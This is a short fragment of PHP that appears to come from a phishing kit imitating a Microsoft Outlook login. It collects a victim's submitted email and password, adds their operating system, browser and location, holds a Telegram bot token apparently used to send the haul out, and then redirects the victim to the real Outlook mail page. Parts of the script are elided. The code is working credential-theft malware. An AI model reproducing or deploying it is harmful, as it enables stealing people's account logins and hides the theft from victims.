...
$message = "Em4il: ".$_POST['uzer']." - P4sx: ".$_POST['pazz']." \r\n";
$message .= " SO= ".$user_os." ".$navegador." ".$userp." ".$pais." ".$region." ".$ciudad."\r\n";
$apiToken = "6128971195:AAGq2n5ZSpv1ff6GCZ9xNI_kVrM5q-oy_GE";
...
}else{ header ('location: https://outlook.live.com/mail/0/'); exit();
 }
